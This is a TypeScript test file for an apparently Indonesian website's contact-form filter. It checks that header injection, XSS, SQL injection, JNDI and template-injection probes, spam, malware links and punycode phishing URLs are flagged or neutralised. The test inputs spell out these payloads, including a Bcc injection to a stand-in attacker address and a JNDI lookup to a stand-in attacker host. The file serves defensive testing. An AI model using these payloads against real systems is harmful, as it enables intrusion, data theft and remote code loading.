import test from 'node:test';
import assert from 'node:assert/strict';
import {
  escapeHtml,
  evaluateManualSpamFilter,
  runDeterministicSpamPrecheck,
  sanitizeHeaderValue,
  validateServerContactPayload,
} from './contactFilter';

test('sanitizeHeaderValue strips CRLF and control chars to block email header injection', () => {
  const malicious = "Budi\r\nBcc: attacker@evil.test\nSubject: Hijacked";
  assert.equal(sanitizeHeaderValue(malicious), 'Budi Bcc: attacker@evil.test Subject: Hijacked');
});

test('escapeHtml encodes special characters safely for email HTML bodies', () => {
  assert.equal(
    escapeHtml('<script>alert("xss")</script> & \'quote\''),
    '&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt; &amp; &#39;quote&#39;'
  );
});

test('validateServerContactPayload accepts valid allowed topic and rejects invalid topics or short messages', () => {
  const valid = validateServerContactPayload({
    name: 'Raka Pratama',
    email: 'RAKA@uinsa.ac.id',
    topic: 'Diskusi Sastra & Penulisan',
    message: 'Halo Naufal, saya ingin berdiskusi soal cerpen dan proyek zine kampus.',
  });
  assert.equal(valid.ok, true);
  if (valid.ok) {
    assert.equal(valid.data.email, 'raka@uinsa.ac.id');
  }

  const badTopic = validateServerContactPayload({
    name: 'Raka',
    email: 'raka@uinsa.ac.id',
    topic: 'Topik Palsu',
    message: 'Pesan yang cukup panjang untuk diuji.',
  });
  assert.equal(badTopic.ok, false);
});

test('evaluateManualSpamFilter blocks honeypot, HTML/script injection, disposable email, shortener URLs, and spam while allowing valid correspondence', () => {
  const genuine = runDeterministicSpamPrecheck({
    name: 'Nadia Putri',
    email: 'nadia@uinsa.ac.id',
    topic: 'Agenda EDSA Executive 2026',
    message: 'Halo Naufal, apakah EDSA menerima kolaborasi bedah puisi bulan depan? Info di https://uinsa.ac.id ya.',
    website: '',
  });
  assert.equal(genuine.flagged, false);

  const botHoneypot = evaluateManualSpamFilter({
    name: 'Bot',
    email: 'bot@example.com',
    topic: 'Diskusi Sastra & Penulisan',
    message: 'Halo ini pesan otomatis dari bot.',
    website: 'https://spam.example',
  });
  assert.equal(botHoneypot.flagged, true);

  const scriptAttack = evaluateManualSpamFilter({
    name: 'Attacker',
    email: 'test@example.com',
    topic: 'Diskusi Sastra & Penulisan',
    message: 'Cek payload <script>alert(1)</script> untuk halaman kontak.',
    website: '',
  });
  assert.equal(scriptAttack.flagged, true);

  const disposableEmail = evaluateManualSpamFilter({
    name: 'Anonim',
    email: 'spammer@mailinator.com',
    topic: 'Diskusi Sastra & Penulisan',
    message: 'Halo Naufal, tolong balas pesan saya segera ya.',
    website: '',
  });
  assert.equal(disposableEmail.flagged, true);

  const gamblingSpam = evaluateManualSpamFilter({
    name: 'Promo',
    email: 'promo@example.com',
    topic: 'Diskusi Sastra & Penulisan',
    message: 'Daftar sekarang situs slot gacor maxwin bonus member baru!',
    website: '',
  });
  assert.equal(gamblingSpam.flagged, true);

  const linkSpam = evaluateManualSpamFilter({
    name: 'SEO',
    email: 'seo@example.com',
    topic: 'Diskusi Sastra & Penulisan',
    message: 'Cek https://a.test dan https://b.test sekarang juga.',
    website: '',
  });
  assert.equal(linkSpam.flagged, true);

  const shortenerSpam = evaluateManualSpamFilter({
    name: 'Promo',
    email: 'promo@example.com',
    topic: 'Diskusi Sastra & Penulisan',
    message: 'Klik tautan ini untuk hadiah https://bit.ly/hadiah-palsu',
    website: '',
  });
  assert.equal(shortenerSpam.flagged, true);

  const sqliProbe = evaluateManualSpamFilter({
    name: 'Tester',
    email: 'tester@example.com',
    topic: 'Diskusi Sastra & Penulisan',
    message: "admin' OR '1'='1' UNION SELECT username, password FROM users--",
    website: '',
  });
  assert.equal(sqliProbe.flagged, true);

  const sstiProbe = evaluateManualSpamFilter({
    name: 'Scanner',
    email: 'scan@example.com',
    topic: 'Diskusi Sastra & Penulisan',
    message: 'Testing ${jndi:ldap://evil.example/a} and {{constructor.constructor}}',
    website: '',
  });
  assert.equal(sstiProbe.flagged, true);

  const svgXss = evaluateManualSpamFilter({
    name: 'Attacker',
    email: 'xss@example.com',
    topic: 'Diskusi Sastra & Penulisan',
    message: 'Lihat ini <svg onload="alert(1)"> ya kak.',
    website: '',
  });
  assert.equal(svgXss.flagged, true);

  const malwareLink = evaluateManualSpamFilter({
    name: 'Undangan',
    email: 'undangan@example.com',
    topic: 'Undangan & Acara Kampus',
    message: 'Silakan unduh surat undangan resmi di https://contoh.test/undangan-nikah.apk',
    website: '',
  });
  assert.equal(malwareLink.flagged, true);

  const punycodePhishing = evaluateManualSpamFilter({
    name: 'Verifikasi',
    email: 'help@example.com',
    topic: 'Diskusi Sastra & Penulisan',
    message: 'Buka tautan berikut https://xn--gogle-1ta.example/login sekarang',
    website: '',
  });
  assert.equal(punycodePhishing.flagged, true);
});
